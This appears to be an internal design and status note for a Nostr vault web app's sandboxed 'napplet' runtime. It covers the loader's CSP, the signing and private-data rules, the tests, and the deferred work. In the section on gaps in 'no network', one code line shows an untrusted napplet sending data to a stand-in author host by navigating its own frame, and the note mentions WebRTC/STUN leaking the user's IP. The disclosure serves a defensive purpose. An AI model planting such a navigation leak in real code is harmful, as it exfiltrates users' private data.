# Napplets P1: the shell runtime

**Date:** 2026-11-14. **Plan:** P1 of RESEARCH/NV_WEB_NAPPLET_PLAN.md (shell runtime, hidden). Nothing deployed;
nostrvault.app unchanged. Open it at `/vault/?shell=1` (nothing links there).

## What ships

| File | What it is |
|---|---|
| `web-vault/public/napplet-frame.html` | The loader. Framed `sandbox="allow-scripts"`, says `nv-loader.ready` once, then writes the napplet the shell posts over itself |
| `src/napplet/csp.js` `loaderCsp()` | The loader's header CSP: no fetch/connect/img/media to the network, inline script allowed, only the vault may frame it, `sandbox allow-scripts` in the header too. Same string in `website/nginx.conf`, vite dev and `server.mjs` (test-checked) |
| `src/napplet/host.js` | With `loader`: ready, then write, then one `napplet.hello`. Exactly two loads; a third (the napplet reloading or navigating itself) removes the frame |
| `src/napplet/manifest.js` | Kinds 5129/15129/35129: one `x` (artifact sha256), `R`/`O` domains, `z`, `i`. Hash gate; a required domain we lack refuses to run |
| `src/napplet/policy.js` | What a napplet may see and sign (below) and per-account grants |
| `src/napplet/dispatch.js` | Answers per domain: shell, identity, theme, storage, outbox, relay, resource, upload, intent, inc, notify |
| `src/napplet/bus.js` | INC topics and INTENT routing between open napplets |
| `src/napplet/shell-deps.js` | The real shell pieces: Haven routes, signer, pool, block list, Blossom, notices |
| `src/napplet/storage-idb.js` | NAP-STORAGE in the shell's IndexedDB, per account, scoped `publisher:dTag[:hash]` (a picked file's shared scope is its hash, not its name) |
| `src/napplet/fetch-policy.js` | resource fetches: https to the public web only, never LAN/loopback/CGNAT/.local/.fips/.onion |
| `src/napplet/runtime.js`, `NappletShell.jsx` | hash -> manifest -> domains -> grant (asked once) -> mount; the `?shell=1` page with the consent and ask sheets |

The runtime is its own lazy chunk (NappletShell, 239 KB raw / 50 KB gz, most of it the shim prelude); the boot
bundle doesn't grow by it.

## The rules (Logen's decisions 2, 5, 6)

- **Outside napplets see vault-private data only with the user's grant**, off by default in the consent sheet. Without
  it: reads come from the network only (never Haven), private kinds are removed (DMs, gift wraps, 10000, 10050,
  30078, wallet), mutes/blocks are refused, and the vault's files are not offered.
- **Every napplet, ours included,** gets the shell's block list applied to what it reads.
- **Signing:** the shell signs; a napplet never sees a key. Account lists (0, 3, 10000, 10002, 10006, 10050, 10063)
  are never signed for any napplet (the app's guarded editors own them); credential kinds (22242, 24242, 27235, NWC)
  and Request to Vanish (62) never. Checked twice: dispatch.js `signDecision`, then shell-deps.js `sign()`.
- **Deletions (kind 5)** may not name a protected kind in `a`/`k`, and every `e` id is looked up by the shell (vault
  and network): it must be found, be the user's, and not be a protected kind. The sheet says "delete N of your posts".
- **Pre-signed sends (`relay.publish`)** refuse protected kinds and kind 5, so an old signed follow list, relay list
  or vanish request of the user's can't be replayed.
- **Ask sheets** show the text and, for any kind without a plain name, a count of its tags by type.
  Outside napplets get an ask sheet before each post, upload and pre-signed send; notifications ask once.

### What "no network" does not cover

The frame's CSP stops fetch, XHR, WebSocket, images, media, fonts and forms. It does **not** stop:

- the napplet navigating its own frame (`location = "https://author.example/?d=" + data`): `sandbox="allow-scripts"`
  allows self-navigation and CSP has no `navigate-to`. host.js removes the frame on that load, but the request has
  already left;
- WebRTC/STUN.

So an outside napplet can tell its author the user's IP next to their pubkey, and one with the private-data grant can
send them whatever it read (mutes, the vault's feed and inbox, its storage). The consent sheet says so on the
private-data checkbox. The fix, a separate origin for the loader plus a network-blocking service worker, came in
P2 (P2_EMOJI.md): navigation is closed there; WebRTC through a child frame is not.
- **First-party** napplets (built into the bundle) are trusted like the screens they replace.

## Checked

- `web-vault/test/napplet-runtime.test.mjs`, 21 tests; whole suite 2306/2306. Mutation-checked: reading the vault
  without the grant, signing a list kind, and the loader accepting a message from anyone but its parent each fail a test.
- Headless Chrome, shell page under the live vault CSP, napplet through the served loader: its inline script ran,
  `origin` null, `fetch` and `localStorage` blocked, no `window.nostr`; vault and kind 4 withheld; publish asked, a no
  signed nothing; kind 3 refused; its own reload removed it and closed its subscriptions.
- Built app, read-only throwaway npub, real relays: Note Drafts runs with the account's key; a picked file gets the
  consent sheet, then reads public notes and is refused the mute list.

## Not in P1 (on purpose)

- `relay.publishEncrypted` and DMs: a napplet's job from P7 (decision 5). Answered "unsupported".
- `inc.channel.*`: answered "unsupported"; topics work.
- Vault/mesh files through `resource`: P5 (the private gate is already in place).
- `range` on `resource.bytes` is our extension (P0 video decision); `blossom:` URIs are fetched whole and hash-checked.
- Upload still uses the app's Blossom code in the shell; decision 5 moves Blossom logic out from P2 on, leaving the
  shell only the signing and the socket.
